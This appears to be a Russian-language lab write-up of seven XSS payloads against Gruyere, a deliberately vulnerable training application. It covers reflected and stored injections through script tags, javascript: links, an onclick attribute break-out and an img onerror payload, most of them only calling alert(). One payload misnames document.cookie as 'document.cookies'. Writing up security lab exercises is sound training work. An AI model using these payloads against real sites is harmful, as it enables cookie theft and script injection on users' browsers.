# Payloads для gruyere

_Пример оформления работы_

## Payload 1

По ссылке `https://example.com/example`. Параметр `example` можно заменить на `<script>alert(document.cookies)</script>` для выполнения Reflected XSS инъекции в элементе `<div id="search-query-param">...</div>`, который выдаст все cookie 

## Payload 2

Вставить в профиле ```javascript:alert(3124)``` в качестве главной страницы, переходя по этой ссылке код выполняется

## Payload 3

```black;' onclick='javascript:alert(32552);'```
При создании снипетта можно создать ссылку, при наведении на которую будет выполняться скрипт. read this!

## Payload 4

Если в моих сниппетах в конце адресной строки вставить ```<a%20href="javas/x00cript:javascript:alert(1)"%20id="fuzzelement1"><script>alert("1234")</script></a>```, то код выполниться.

## Payload 5

Если в поисковой строке написать ```<script>alert(4231)</script>``` код выполнится.

## Payload 6

Если в sign in/sign up в конце адресной строки вствить ```<img src="/" =_=" title="onerror='alert(21314)'">```, то код выполниться.

## Payload 7

Когда загружаем файл со скриптом ```<script>alert(745674657243523)</script>```, при переходе на страницу с файлом код выполняется.
